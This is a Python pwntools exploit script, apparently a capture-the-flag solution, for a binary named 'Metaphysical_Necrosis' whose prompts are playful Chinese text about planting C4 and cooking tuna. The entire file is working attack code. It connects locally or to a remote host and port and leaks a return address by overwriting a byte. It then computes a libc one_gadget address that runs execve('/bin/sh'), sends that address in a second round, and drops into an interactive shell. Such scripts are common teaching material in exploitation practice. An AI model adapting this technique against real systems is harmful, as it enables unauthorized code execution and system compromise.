#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './Metaphysical_Necrosis'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = 'libc-2.23.so'
is_local = False
is_remote = False
if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote=True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# gadget
# elf, libc

print ru('你要把C4安放在哪里呢？\n')
# debug()
sl('5')
if is_local:  se('\x43')
if is_remote: se('\x08')
sleep(1)
ru('the bomb has been planted!\n')
sl('')
print ru('不如把它宰了，吃一顿大餐，你说吼不吼啊！\n')
sl('')
ru('起个名字:')
sl('Imagin')
ru('切成几段呢？\n')
sl('20')
for i in range(20):
	ru('怎么料理呢：')
	sl(p64(i+0xdeadbeef))
ru('金枪鱼吃了大半。\n')
sl('')
ru('仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。\n')
sl('')
ru('的路程是__m:')
meter = 5 # 好像没啥用
sl(str(meter))

ru('Terrorist Win\n')
addr = u64(rc(6).ljust(8,'\0'))
log.hexdump(addr)
info_addr("ret",addr)

if is_remote:
    offset_addr = 0x20808
    offset_one_gadget = 0x45216
if is_local: 
    offset_addr = 0x26B43
    offset_one_gadget =  0x106ef8
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
'''

one_gadget = addr - offset_addr + offset_one_gadget
info_addr('one_gadget', one_gadget)

ru('~~！~？~…____\n')

#debug('b *'+hex(addr))
sl('')

# round2

print ru('你要把C4安放在哪里呢？\n')
sl('5')
se(p64(one_gadget)) # one_gadget
sleep(1)
ru('the bomb has been planted!\n')
sl('')
print ru('不如把它宰了，吃一顿大餐，你说吼不吼啊！\n')
sl('')
ru('起个名字:')
sl('Imagin')
ru('切成几段呢？\n')
sl('20')
for i in range(20):
    ru('怎么料理呢：')
    sl(p64(i+0xdeadbeef))
ru('金枪鱼吃了大半。\n')
sl('')
ru('仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。\n')
sl('')
ru('的路程是__m:')
meter = 5 # 好像没啥用
sl(str(meter))

ru('Terrorist Win\n')
addr = u64(rc(6).ljust(8,'\0'))
log.hexdump(addr)
info_addr("ret",addr)

ru('~~！~？~…____\n')

sl('')

p.interactive()

